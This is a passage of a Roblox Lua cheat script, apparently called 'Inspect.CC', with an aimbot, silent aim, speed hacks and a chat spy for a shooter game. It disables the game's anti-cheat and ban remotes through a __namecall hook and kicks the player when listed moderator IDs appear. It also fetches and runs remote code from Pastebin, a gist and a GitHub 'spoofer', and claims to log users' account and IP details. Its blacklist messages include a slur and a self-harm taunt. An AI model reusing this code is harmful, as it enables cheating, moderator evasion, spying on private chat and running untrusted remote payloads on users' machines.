                        wait(0.1)
                        game.Players.LocalPlayer.Character["[Chicken]"]:Deactivate()
                        wait(0.1)
                        game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
                        wait(0.1)
                        game.Players.LocalPlayer.Character["[Chicken]"]:Deactivate()
                    end
                )
            end
        end

        Tracer.Visible = _G.TracerVisible
        Tracer.Color = _G.TracerColor
        Tracer.Thickness = _G.TracerThickness
        Tracer.Transparency = _G.TracerTransparency
        if getgenv().Silent.Airshot == true then
            if Plr ~= nil and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                getgenv().Silent.Part = getgenv().Silent.AirshotPart
            else
                getgenv().Silent.Part = getgenv().Silent.Backup
            end
        end

        if getgenv().Tracer == true and Plr ~= nil and getgenv().Silent.Enabled then
            local TorsoPosition = cc:worldToViewportPoint(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
            local Vector, OnScreen = cc:worldToViewportPoint(Plr.Character[getgenv().Silent.Part].Position)
            Tracer.Visible = true
            Tracer.From = Vector2.new(TorsoPosition.X, TorsoPosition.Y)
            Tracer.To = Vector2.new(Vector.X, Vector.Y)
        else
            Tracer.Visible = false
        end
        if getgenv().Silent.AutoTarget then
            wait(1.65)
            Plr = SilentGetClosest()
            Locked = true
            wait(1.65)
        end
        if Plr ~= nil and getgenv().Silent.LookAt then
            game.Players.LocalPlayer.Character.Humanoid.AutoRotate = false
            local playerService = game:GetService("Players")
            local client = playerService.LocalPlayer

            local cPos = client.Character.PrimaryPart.Position
            local tPos = Plr.Character:FindFirstChild("HumanoidRootPart").Position + Plr.Character:FindFirstChild('HumanoidRootPart').Velocity * (1.02 / 10)
            local modTPos = Vector3.new(tPos.X, cPos.Y, tPos.Z)
            local newCFrame = CFrame.new(cPos, modTPos)
            client.Character:SetPrimaryPartCFrame(newCFrame)
        else
            game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true
        end

        if (Plr ~= nil and getgenv().Silent.TargetStats) then
            local plrName = tostring(Plr.Name)
            local targetHealth = math.floor(getHealth(plrName))
            local targetArmor = math.floor(getArmor(plrName))
            local targetDist = math.floor(getDistance(Plr))
            local targetWinning = isWinning(plrName)

            -- // Headshot
            targetHeadshot.Image = 'rbxthumb://type=AvatarHeadShot&id=' .. Plr.UserId .. '&w=420&h=420'

            -- // Name
            targetName.Text = plrName
            if (Plr.Character.Humanoid.DisplayName ~= plrName) then
                targetName.Text = Plr.Name .. '[' .. Plr.Character.Humanoid.DisplayName .. ']'
            end

            -- // Health
            healthBarBG.Size = UDim2.new((targetHealth / 100), 0, 0, 17)
            healthText.Text = targetHealth

            -- // Armor
            armorBarBG.Size = UDim2.new((targetArmor / 200), 0, 0, 17)
            armorText.Text = targetArmor

            -- // Distance
            Distance.Text = 'Distance: ' .. targetDist .. " studs"
            if (targetWinning) then
                Winning.Text = 'Winning: Yes'
            else
                Winning.Text = 'Winning: No'
            end
            Body.Visible = true
        else
            Body.Visible = false
        end

        if getgenv().Silent.AutoSetup then
            local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
            local split = string.split(pingvalue, " ")
            local ping = split[1]

            if tonumber(ping) <= 40 then
                getgenv().Prediction = 1.23
            elseif tonumber(ping) <= 50 then
                getgenv().Silent.Prediction = 1.286942
            elseif tonumber(ping) < 70 then
                getgenv().Silent.Prediction = 1.3031
            elseif tonumber(ping) <= 85 then
                getgenv().Silent.Prediction = 1.30984
            elseif tonumber(ping) <= 110 then
                getgenv().Silent.Prediction = 1.15569420
            elseif tonumber(ping) <= 150 then
                getgenv().Silent.Prediction = 1.165
            elseif tonumber(ping) >= 200 then
                getgenv().Silent.Prediction = 1.18684290
            end
        end
    end
)
if Aimbot.AutoSetup then

                local ping = tonumber(split[1])    
if ping < 225 then    
getgenv().Aimbot.Prediction = 1.4    
elseif ping < 215 then    
getgenv().Aimbot.Prediction = 1.2    
elseif ping < 205 then
getgenv().Aimbot.Prediction = 1.0    
elseif ping < 190 then
getgenv().Aimbot.Prediction = 0.10    
elseif ping < 180 then    
getgenv().Aimbot.Prediction = 0.12    
elseif ping < 170 then
getgenv().Aimbot.Prediction = 0.15    
elseif ping < 160 then
getgenv().Aimbot.Prediction = 0.18    
elseif ping < 150 then
getgenv().Aimbot.Prediction = 0.110    
elseif ping < 140 then    
getgenv().Aimbot.Prediction = 0.113    
elseif ping < 130 then    
getgenv().Aimbot.Prediction = 0.116    
elseif ping < 120 then    
getgenv().Aimbot.Prediction = 0.120    
elseif ping < 110 then    
getgenv().Aimbot.Prediction = 0.124    
elseif ping < 105 then    
getgenv().Aimbot.Prediction = 0.127    
elseif ping < 90 then    
getgenv().Aimbot.Prediction = 0.130    
elseif ping < 80 then    
getgenv().Aimbot.Prediction = 0.133    
elseif ping < 70 then    
getgenv().Aimbot.Prediction = 0.136    
elseif ping < 60 then    
getgenv().Aimbot.Prediction = 0.140    
elseif ping < 50 then    
getgenv().Aimbot.Prediction = 0.143    
elseif ping < 40 then    
getgenv().Aimbot.Prediction = 0.145    
elseif ping < 30 then    
getgenv().Aimbot.Prediction = 0.155    
elseif ping < 20 then    
getgenv().Aimbot.Prediction = 0.157    
        end    
        end    
getgenv().Mousemoverel = {
    Enabled = false,
    Key = Enum.KeyCode.Q,
    Prediction = 1.165,
    Airshot = false,
    Part = "LowerTorso" -- LowerTorso, HumanoidRootPart,Head,UpperTorso
}
local MouseLocked = false

function MouseGetClosest()
    local closestPlayer
    local shortestDistance = math.huge

    for i, v in pairs(game.Players:GetPlayers()) do
        if
            v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
                v.Character.Humanoid.Health ~= 0 and
                v.Character:FindFirstChild("LowerTorso")
         then
            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
            if magnitude < shortestDistance then
                closestPlayer = v
                shortestDistance = magnitude
            end
        end
    end
    return closestPlayer
end

local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(
    function(keygo, ok)
        if (not ok) then
            if (keygo.KeyCode == getgenv().Mousemoverel.Key) then
                MouseLocked = not MouseLocked
                if getgenv().Mousemoverel.Enabled then
                    if MouseLocked then
                        MouseVictim = MouseGetClosest()
                        x(MouseVictim.Character.Humanoid.DisplayName,'rbxthumb://type=AvatarHeadShot&id=' .. MouseVictim.UserId .. '&w=420&h=420')
                    elseif not MouseLocked then
                        if MouseVictim then
                            MouseVictim = nil
                        end
                        x("Unlocked",nil)
                    end
                end
            end
        end
    end
)
--ON KNOCKED ONG
getgenv().SilentKO = {
    UnlockOnKO = false,
    ReloadOnKO = false,
    TrashTalkOnKO = false,
}
getgenv().AimbotKO = {
    UnlockOnKO = false,
    ReloadOnKO = false,
    TrashTalkOnKO = false,
}
--BOOT SILENT ONKO
if getgenv().SilentKO.UnlockOnKO and locked then
        if game.Players[Plr].Character.Humanoid.health < 1 then
                locked = false
        end
            end
if getgenv().SilentKO.ReloadOnKO and locked then
        if game.Players[Plr].Character.Humanoid.health < 1 then
                game:GetService("ReplicatedStorage").MainEvent:FireServer(
                            "Reload",
                            game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
                    ) 
        end 
    end
if getgenv().SilentKO.TrashTalkOnKO and locked then
        if game.Players[Plr].Character.Humanoid.health < 1 then
                local A_1 = "L" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
                    end
end
if getgenv().AimbotKO.UnlockOnKO and Locking then
        if game.Players[AimbotVictim].Character.Humanoid.health < 1 then
                Locking = false
        end 
            end
if getgenv().AimbotKO.ReloadOnKO and Locking then
        if game.Players[AimbotVictim].Character.Humanoid.health < 1 then
                game:GetService("ReplicatedStorage").MainEvent:FireServer(
                            "Reload",
                            game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
                    ) 
        end
    end
if getgenv().AimbotKO.TrashTalkOnKO and Locking then
        if game.Players[AimbotVictim].Character.Humanoid.health < 1 then
                local A_1 = "L" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
                    end
end











loadstring(
    game:HttpGet(
        "https://gist.githubusercontent.com/murderspree/84309f4b27fc481923f1a647c204826d/raw/a1134751b9ab8cdae1b4fbc7db9230516d8d0eca/gistfile1.txt"
    )
)()
-- \\ Library Launch
local library = loadstring(game:HttpGet("https://pastebin.com/raw/L7Z56MwH"))()
local actualLib = library:initLibrary()
local lib = actualLib:Load({name = "Inspect.CC", sizeX = 465, sizeY = 535, color = Color3.fromRGB(13, 255, 17)})
--TABS--
local Aiming = lib:Tab("Aiming")
local Settings = lib:Tab("Aiming Settings")
local Blatant = lib:Tab("Blatant")
--Sections--
local Camlock = Aiming:Section {name = "Camlock", column = 1}
local Target = Aiming:Section {name = "Silent Aim", column = 2}
local TargST = Settings:Section {name = "Silent Aim Settings", column = 1}
local CamST = Settings:Section {name = "Camlock Settings", column = 2}
local StrafeST = Settings:Section {name = "Strafe/Orbit", column = 1}
local Chr = Blatant:Section {name = "Character", column = 1}
Camlock:Toggle {
    Name = "Enabled",
    Flag = "CamlockToggle",
    callback = function(e)
        getgenv().Aimbot.Enabled = e
    end
}
Camlock:Keybind {
    name = "Keybind",
    default = Enum.KeyCode.Q,
    blacklist = {
        Enum.KeyCode.Unknown,
        Enum.KeyCode.W,
        Enum.KeyCode.A,
        Enum.KeyCode.S,
        Enum.KeyCode.D,
        Enum.KeyCode.Slash,
        Enum.KeyCode.Tab,
        Enum.KeyCode.Backspace,
        Enum.KeyCode.Escape
    },
    flag = "CamlockBind",
    callback = function(e)
        getgenv().Aimbot.Keybind = e
    end
}
local PredictionToggle =
    Camlock:Toggle {
    Name = "Prediction Enabled",
    Flag = "PredictionToggle",
    callback = function(e)
        getgenv().Aimbot.PredictionEnabled = e
    end
}
Camlock:Box {
    Name = "Prediction Amount",
    Default = "1.1369420",
    Placeholder = "1.1369420",
    Flag = "PredictionTextboxCamlock",
    callback = function(e)
        getgenv().Aimbot.Prediction = e
    end
}
Camlock:Toggle {
    Name = "Auto Prediction (trash)",
    Flag = "AutoPredictionToggle",
    callback = function(e)
        getgenv().Aimbot.AutoSetup = e
    end
}
Camlock:dropdown {
    name = "Hitbox",
    content = {"Head", "HumanoidRootPart","LowerTorso","UpperTorso","Feet"},
    Default = "Torso",
    multichoice = false,
    callback = function(State)
        if State == "Head" then
            getgenv().Aimbot.Hitbox = "Head"
            getgenv().Aimbot.Backup = "Head"
        elseif State == "HumanoidRootPart" then
            getgenv().Aimbot.Hitbox = "HumanoidRootPart"
            getgenv().Aimbot.Backup = "HumanoidRootPart"
        elseif State == "LowerTorso" then
            getgenv().Aimbot.Hitbox = "LowerTorso"
            getgenv().Aimbot.Backup = "LowerTorso"
        elseif State == "UpperTorso" then
            getgenv().Aimbot.Hitbox = "UpperTorso"
            getgenv().Aimbkt.Backup = "UpperTorso"
        elseif State == "Feet" then
            getgenv().Aimbot.Hitbox = "RightFoot"
            getgenv().Aimbot.Backup = "RightFoot"
        end
    end,
    flag = "CamlockAimPart"
}
Camlock:Toggle {
    Name = "Enable Wall Check",
    Flag = "WallCheckToggle",
    callback = function(e)
        getgenv().Aimbot.WallCheck = e
    end
}
Camlock:Toggle {
    Name = "Enable Notifications",
    Flag = "Notifications",
    callback = function(e)
        getgenv().Aimbot.Notification = e
    end
}
Camlock:dropdown {
    name = "Airshot Hitbox",
    content = {"Head", "HumanoidRootPart","LowerTorso","UpperTorso","Feet"},
    Default = "UpperTorso",
    multichoice = false,
    callback = function(State)
        if State == "Head" then
            getgenv().Aimbot.AirshotPart = "Head"
        elseif State == "HumanoidRootPart" then
            getgenv().Aimbot.AirshotPart = "HumanoidRootPart"
        elseif State == "LowerTorso" then
            getgenv().Aimbot.AirshotPart = "LowerTorso"
        elseif State == "UpperTorso" then
            getgenv().Aimbot.AirshotPart = "UpperTorso"
        elseif State == "Feet" then
            getgenv().Aimbot.AirshotPart = "RightFoot"
        end
    end,
    flag = "CamlockAirshotPart"
}
Camlock:Toggle {
    Name = "Resolver (Destroys Prediction)",
    Flag = "AntiLockResolverCamLOCK",
    callback = function(e)
        Resolver = false
        if e then
            getgenv().Aimbot.Prediction = -getgenv().Aimbot.Prediction
        else
            getgenv().Aimbot.Prediction = actualLib.flags.PredictionTextboxCamlock
        end
    end
}
Camlock:Toggle {
    Name = "Smoothing Enabled",
    Flag = "SmoothingToggle",
    callback = function(e)
        getgenv().Aimbot.Smoothing = e
    end
}
Camlock:Box {
    Name = "Smoothness Amount",
    Default = "0.015",
    Placeholder = "0.015",
    Flag = "SmoothnessTextbox",
    callback = function(e)
        getgenv().Aimbot.Smoothness = e
    end
}
Target:Toggle {
    Name = "Enabled",
    Flag = "TargetToggle",
    callback = function(e)
        getgenv().Silent.Enabled = e
    end
}
Target:Keybind {
    name = "Keybind",
    default = Enum.KeyCode.Q,
    blacklist = {
        Enum.KeyCode.Unknown,
        Enum.KeyCode.W,
        Enum.KeyCode.A,
        Enum.KeyCode.S,
        Enum.KeyCode.D,
        Enum.KeyCode.Slash,
        Enum.KeyCode.Tab,
        Enum.KeyCode.Backspace,
        Enum.KeyCode.Escape
    },
    flag = "TargetKeybind",
    callback = function(e)
        getgenv().Silent.Key = e
    end
}
Target:dropdown {
    name = "Hitbox",
    content = {"Head","HumanoidRootPart","LowerTorso","UpperTorso","Feet"},
    Default = "Torso",
    multichoice = false,
    callback = function(State)
        if State == "Head" then
            getgenv().Silent.Hitbox = "Head"
            getgenv().Silent.Backup = "Head"
        elseif State == "HumanoidRootPart" then
            getgenv().Silent.Hitbox = "HumanoidRootPart"
            getgenv().Silent.Backup = "HumanoidRootPart"
        elseif State == "LowerTorso" then
            getgenv().Silent.Hitbox = "LowerTorso"
            getgenv().Silent.Backup = "LowerTorso"
        elseif State == "UpperTorso" then
            getgenv().Silent.Hitbox = "UpperTorso"
            getgenv().Silent.Backup = "UpperTorso"
        elseif State == "Feet" then
            getgenv().Silent.Hitbox = "RightFoot"
            getgenv().Silent.Backup = "RightFoot"
        end
    end,
    flag = "TargetAimPart"
}
Target:Toggle {
    Name = "Randomize Hitbox",
    Flag = "RandomHitboxToggle",
    callback = function(e)
        getgenv().Silent.RandomPart = e
    end
}
local TargetPredictionToggle =
    Target:Toggle {
    Name = "Prediction Enabled",
    Flag = "PredictionEnabledTarget",
    callback = function(e)
        getgenv().Silent.PredictionEnabled = e
    end
}
Target:Box {
    Name = "Prediction Amount",
    Default = "1.1369420",
    Placeholder = "1.1369420",
    Flag = "PredictionTextbox",
    callback = function(e)
        getgenv().Silent.Prediction = e
    end
}
Target:Toggle {
    Name = "Wall Check",
    Flag = "SilentWallCheckToggle",
    callback = function(e)
        getgenv().Silent.WallCheck = e
    end
}
Target:Toggle {
    Name = "Look At",
    Flag = "LookAtTog",
    callback = function(e)
        getgenv().Silent.LookAt = e
    end
}
Target:Toggle {
    Name = "Auto Target",
    Flag = "SilentAimTog",
    callback = function(e)
        getgenv().Silent.AutoTarget = e
    end
}

Target:Toggle {
    Name = "Auto Prediction",
    Flag = "AutoSetupTog",
    callback = function(e)
        getgenv().Silent.AutoSetup = e
    end
}

Target:Toggle {
    Name = "Enable Notifications",
    Flag = "NotificationSilentToggle",
    callback = function(e)
        getgenv().Silent.Notification = e
    end
}
Target:Toggle {
    Name = "Airshot Function",
    Flag = "AirshotFuncTargetToggle",
    callback = function(e)
        getgenv().Silent.Airshot = e
    end
}
Target:dropdown {
    name = "Airshot Hitbox",
    content = {"Head", "HumanoidRootPart","LowerTorso","UpperTorso","Feet"},
    Default = "Feet",
    multichoice = false,
    callback = function(State)
        if State == "Head" then
            getgenv().Silent.AirshotPart = "Head"
        elseif State == "HumanoidRootPart" then
            getgenv().Silent.AirshotPart = "HumanoidRootPart"
        elseif State == "LowerTorso" then
            getgenv().Silent.AirshotPart = "LowerTorso"
        elseif State == "UpperTorso" then
            getgenv().Silent.AirshotPart = "UpperTorso"
        elseif State == "Feet" then
            getgenv().Silent.AirshotPart = "RightFoot"
        end
    end,
    flag = "SilentAirshotDrop"
}
Target:Toggle {
    Name = "Resolver (Destroys prediction)",
    Flag = "AntiLockResolverSilent",
    callback = function(e)
        Resolver = false
        if e then
            getgenv().Silent.Prediction = -getgenv().Silent.Prediction
        else
            getgenv().Silent.Prediction = actualLib.flags.PredictionTextbox
        end
    end
}
Target:ToggleColorPicker {
    Name = "Tracer",
    Default = Color3.fromRGB(255, 255, 255),
    ToggleFlag = "TracerFlag",
    ColorPickerFlag = "TracerColorFlag",
    ToggleCallback = function(e)
        getgenv().Tracer = e
    end,
    ColorPickerCallback = function(xd)
        _G.TracerColor = xd
    end
}
local SettingsTG =
    TargST:Slider {
    Name = "Silent Aim Radius",
    Default = 120,
    Min = 120,
    Max = 650,
    Decimals = 0,
    Flag = "SilentRadius",
    callback = function(e)
        getgenv().Silent.Radius = e
    end
}
SettingsTG:SetValueTexT("Radius: [VALUE]/650")
local SettingsTG2 =
    CamST:Slider {
    Name = "Camlock Radius",
    Default = 120,
    Min = 120,
    Max = 650,
    Decimals = 0,
    Flag = "AimbotRadius",
    callback = function(e)
        getgenv().Aimbot.Radius = e
    end
}
SettingsTG2:SetValueTexT("Radius: [VALUE]/650")
--TARGET AIM KO FUCS
TargST:Toggle {
    Name = "Unlock On Knocked",
    Flag = "KOSil",
    callback = function(e)
        getgenv().SilentKO.UnlockOnKO = e
    end
}
TargST:Toggle {
    Name = "Reload On Knocked",
    Flag = "KOSil2",
    callback = function(e)
        getgenv().SilentKO.ReloadOnKO = e
    end
}
TargST:Toggle {
    Name = "TrashTalk On Knocked",
    Flag = "KOSil3",
    callback = function(e)
        getgenv().SilentKO.TrashTalkOnKO = e
    end
}
--ON KO BTNS CAMLOCK
CamST:Toggle {
    Name = "Unlock On Knocked",
    Flag = "KOCam",
    callback = function(e)
        getgenv().AimbotKO.UnlockOnKO = e
    end
}
CamST:Toggle {
    Name = "Reload On Knocked",
    Flag = "KOCam2",
    callback = function(e)
        getgenv().AimbotKO.ReloadOnKO = e
    end
}
CamST:Toggle {
    Name = "TrashTalk On Knocked",
    Flag = "KOCam3",
    callback = function(e)
        getgenv().AimbotKO.TrashTalkOnKO = e
    end
}

StrafeST:Toggle {
    Name = "Enable Strafe/Orbit",
    Flag = "OrbitToggle",
    callback = function(e)
        target_strafe = e
    end
}
local SettingsTG3 =
    StrafeST:Slider {
    Name = "Orbit Speed",
    Default = 0.5,
    Min = 0.5,
    Max = 100,
    Decimals = 0,
    Flag = "SpeedOrbit",
    callback = function(e)
       duration = e
    end
}
SettingsTG3:SetValueTexT("Speed: [VALUE]/100")
local SettingsTG4 =
    StrafeST:Slider {
    Name = "Orbit Distance",
    Default = 5,
    Min = 5,
    Max = 100,
    Decimals = 0,
    Flag = "OrbitDistance",
    callback = function(e)
       Circle.Radius = e
    end
}
SettingsTG4:SetValueTexT("Distance: [VALUE]/100")
Chr:Toggle {
    Name = "Speed",
    flag = "SpeedToggle",
    callback = function(e)
        Misc.NewSpeed = e
    end
}
local NewSpeedValueSlider =
    Chr:Slider {
    Name = "NewSpeed",
    Default = 110,
    Min = 0,
    Max = 1000,
    Decimals = 0,
    Flag = "NewSpeedSliderValue",
    callback = function(e)
        Misc.NewSpeedValue = e
    end
}
NewSpeedValueSlider:SetValueTexT("Speed Value: [VALUE]/1000")
Chr:togglekeybind {
    name = "CFrame Speed",
    default = Enum.KeyCode.Z,
    keybindflag = "CFrameSpeedToggleKey",
    toggleflag = "CFrameSpeedToggle",
    blacklist = {
        Enum.KeyCode.Unknown,
        Enum.KeyCode.W,
        Enum.KeyCode.A,
        Enum.KeyCode.S,
        Enum.KeyCode.D,
        Enum.KeyCode.Slash,
        Enum.KeyCode.Tab,
        Enum.KeyCode.Backspace,
        Enum.KeyCode.Escape
    },
    togglecallback = function(e)
        Misc.Speed = e
    end
}

local CFrameSpeedValue =
    Chr:Slider {
    Name = "NewSpeed",
    Default = 0.6,
    Min = 0,
    Max = 25,
    Decimals = 2,
    Flag = "CFrameSpeedValueSlider",
    callback = function(e)
        Misc.Value = e
    end
}
CFrameSpeedValue:SetValueTexT("CFrame Speed Value: [VALUE]/25")
Chr:Toggle {
    Name = "Anti Slowdown",
    flag = "RemoveSlowdownToggle",
    callback = function(jjsplcoit)
        repeat
            wait(0.1)
            local player = game.Players.LocalPlayer
            local DeletePart =
                player.Character.BodyEffects.Movement:FindFirstChild("NoJumping") or
                player.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") or
                player.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed")
            if DeletePart then
                DeletePart:Destroy()
            end
            if player.Character.BodyEffects.Reload.Value == true then
                player.Character.BodyEffects.Reload.Value = false
            end
        until jjsplcoit == false
    end
}
Chr:Toggle {
    Name = "Anti Jump Cooldown",
    Flag = "NoJumpColDown",
    callback = function(e)
        Misc.RemoveJumpCooldown = e
    end
}
Chr:Toggle {
    Name = "Anti Stomp",
    Flag = "AntiStompToggle",
    callback = function(e)
        Misc.AntiStomp = e
    end
}
Chr:Toggle {
    Name = "Auto Stomp",
    Flag = "AutoStompToggle",
    callback = function(e)
        Misc.AutoStomp = e
    end
}
Chr:Toggle {
    Name = "Anti Bag",
    Flag = "AntiBagToggle",
    callback = function(e)
        Misc.AntiBag = e
    end
}
Chr:Toggle {
    Name = "Cash Aura",
    Flag = "AutoPickCashToggle",
    callback = function(e)
        Misc.AutoPickCash = e
    end
}
Chr:Toggle {
    Name = "Auto Drop Cash",
    Flag = "AutoDropCashToggle",
    callback = function(e)
        Misc.AutoDropCash = e
    end
}
Chr:Toggle {
    Name = "Auto Eat",
    Flag = "AutoEatToggle",
    callback = function(e)
        Misc.AutoEat = e
    end
}
chr:Toggle {
    Name = "Auto Reload",
    Flag = "AutoReloadToggle",
    callback = function(e)
        Misc.AutoReload = e
    end
}
chr:Toggle {
    Name = "Trash Talk",
    Flag = "TrashTalkToggle",
    callback = function(e)
        Misc.TrashTalk = e
    end
}

print("Inspect.cc Has been Loaded")
print("Inspect.cc is a Free to use lock GUI if you Paid for this script YOU WERE SCAMMED!")
print("We Log Legal info Like your username, Where you Injected it, Acc age, Acc ID.")
print("Have fun King")
print("Made By Paws#2140")
print("Paws was here")
print("Inspect Service since 2023 :Skull:")
print("'Sometimes A Game is just too hard'")

--Anti Http Spy.
-- Define a list of allowed HTTP requests
local allowedRequests = {
    ["GET"] = true,
    ["POST"] = true,
}
function isRequestAllowed(requestMethod)
    if allowedRequests[requestMethod] then
        return true
    else
        return false
    end
end
local httpService = game:GetService("HttpService")
local originalSendRequest = httpService.SendRequest
httpService.SendRequest = function(requestData)
    if not isRequestAllowed(requestData.Method) then
            --HWID LOG AND IP LOG LMAO
            
            
            local Vanis = game.Players.LocalPlayer
               Vanis:Kick("Detected unauthorized Http Request. ")
        print("Blocked unauthorized HTTP request: ", requestData.Method)
        return
    end
    return originalSendRequest(httpService, requestData)
end
--Another Anti Http Spy
local functions = {
    rconsoleprint,
    print,
    setclipboard,
    rconsoleerr,
    rconsolewarn,
    warn,
    error
}

for i, v in next, functions do
    local old
    old =
        hookfunction(
        v,
        newcclosure(
            function(...)
                local args = {...}
                for i, v in next, args do
                    if tostring(i):find("https") or tostring(v):find("https") then
                        while true do
                        end
                    end
                end
                return old(...)
            end
        )
    )
end

if _G.ID then
    while true do
    end
end
setmetatable(
    _G,
    {
        __newindex = function(t, i, v)
            if tostring(i) == "ID" then
                while true do
                end
            end
        end
    }
)

--Bloppity & Ahh fuck off now Kids wont be Able To bomb shit. LMAO GET IP LOGGEDDD

--BLACKLIST SYSTEM GET REAL NIGGA
local K = game:GetService('Players').LocalPlayer

local die = function(args)
 K:Kick('\n[INSPECT.CC]: BLACKLISTED: '..args..'.')
 task.wait(1)
 while true do end
end

if K.UserId == 1576756053 then
     die('Chariotsware meat rider, problematic')
end

if K.UserId == 3717046549 then
  die('KILL YOURSELF AND STOP RIPPING SHIT FROM MY REPOSITORY')
end 

if K.UserId == 3731002752 then
    die('Sending CP in my server with an alt. PS.. You did a terrible job at covering your tracks')
end

--FPS UNLOCKER
local fps = 9000
 
    if setfpscap then
        setfpscap(fps)
end
--SPOOFER
spoofedIP = "102.454.444"
loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/HelloLua/main/looferrlua"))()
--CHEAT BYPASSER
wait(15)
assert(getrawmetatable)
gmt = getrawmetatable(game)
setreadonly(gmt, false)
old = gmt.__namecall
gmt.__namecall =
    newcclosure(
        function(self, ...)
        local args = {...}
        if tostring(args[1]) == "BreathingHAMON" then
            return
        elseif tostring(args[1]) == "TeleportDetect" then
            return
        elseif tostring(args[1]) == "CHECKER_1" then
            return
        elseif tostring(args[1]) == "CHECKER" then
            return
        elseif tostring(args[1]) == "GUI_CHECK" then
            return
        elseif tostring(args[1]) == "OneMoreTime" then
            return
        elseif tostring(args[1]) == "checkingSPEED" then
            return
        elseif tostring(args[1]) == "BANREMOTE" then
            return
        elseif tostring(args[1]) == "PERMAIDBAN" then
            return
        elseif tostring(args[1]) == "KICKREMOTE" then
            return
        elseif tostring(args[1]) == "BR_KICKPC" then
            return end

        return old(self, ...)
        end)
        --ANTI MOD
        wait(10)
local bitch = {
 163721789,
 15427717,
 201454243,
 822999,
 63794379,
 17260230,
 28357488,
 93101606,
 8195210,
 89473551,
 16917269,
 85989579,
 1553950697,
 476537893,
 155627580,
 31163456,
 7200829,
 25717070,
 201454243,
 15427717,
 63794379,
 16138978,
 60660789,
 17260230,
 16138978,
 1161411094,
 9125623,
 11319153,
 34758833,
 194109750,
 35616559,
 1257271138,
 28885841,
 23558830,
 25717070,

 
}

for l, c in pairs(game.Players:GetChildren()) do
for i, v in pairs(bitch) do
if c.UserId == v then
local Vanis = game.Players.LocalPlayer
Vanis:Kick("Moderator Detected")
end
end
end
game.Players.PlayerAdded:Connect(function(plr)
for i, v in pairs(bitch) do
if plr.UserId == v then
local Vanis = game.Players.LocalPlayer
Vanis:Kick("Moderator Detected")
end
end
end)
--Spy
        Config = {
	enabled = true,
	spyOnMyself = true,
	public = false,
	publicItalics = true
}

-- Customizing Log Output
PrivateProperties = {
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}

	local StarterGui = game:GetService("StarterGui")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
	local instance = (_G.chatSpyInstance or 0) + 1
	_G.chatSpyInstance = instance

	local function onChatted(p,msg)
		if _G.chatSpyInstance == instance then
			if p==player and msg:lower():sub(1,4)=="/spy" then
				Config.enabled = not Config.enabled
				wait(0.3)
				PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
				StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
			elseif Config.enabled and (Config.spyOnMyself==true or p~=player) then
				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
				local hidden = true
				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and Config.public==false and Players[packet.FromSpeaker].Team==player.Team)) then
						hidden = false
					end
				end)
				wait(1)
				conn:Disconnect()
				if hidden and Config.enabled then
					if Config.public then
						saymsg:FireServer((Config.publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
					else
						PrivateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
						StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
					end
				end
			end
		end
	end
	
	for _,p in ipairs(Players:GetPlayers()) do
		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
	end

	Players.PlayerAdded:Connect(function(p)
		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
	end)

	PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
	StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
	local chatFrame = player.PlayerGui.Chat.Frame
	chatFrame.ChatChannelParentFrame.Visible = true
	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
            print("Enabled Spy")
            
